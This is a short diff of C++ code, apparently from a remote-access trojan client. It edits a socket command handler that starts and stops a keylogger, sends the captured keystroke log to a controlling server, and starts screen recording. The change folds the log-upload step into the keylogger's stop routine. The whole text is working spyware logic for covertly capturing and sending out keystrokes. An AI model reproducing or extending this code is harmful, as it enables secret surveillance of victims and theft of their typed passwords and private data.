@@ -207,15 +207,9 @@ void handle_command(const std::string& command, SOCKET sock) {
     else if (command == "STOP_KEYLOGGER") {
         std::cout << "[Action] Stopping keylogger..." << std::endl;
         
-        keylogger.stopKeylogger();
+        keylogger.stopKeylogger(sock);
         const char* keylogFileName = keylogger.getKeylogFileName();
-        std::cout << "[Action] Keylogger stopped. File saved as: " << keylogFileName << std::endl;
-
-        if (keylogger.sendFileViaMsgPack(sock, keylogFileName)) {
-            std::cout << "[Success] Log file sent to server" << std::endl;
-        } else {
-            std::cout << "[Warning] Log file saved locally but failed to send" << std::endl;
-        }
+        std::cout << "[Action] Keylogger stopped and file sent. File: " << keylogFileName << std::endl;
     }
     else if (command == "START_SCREEN_RECORDING") {
         std::cout << "[Action] Starting screen recording..." << std::endl;
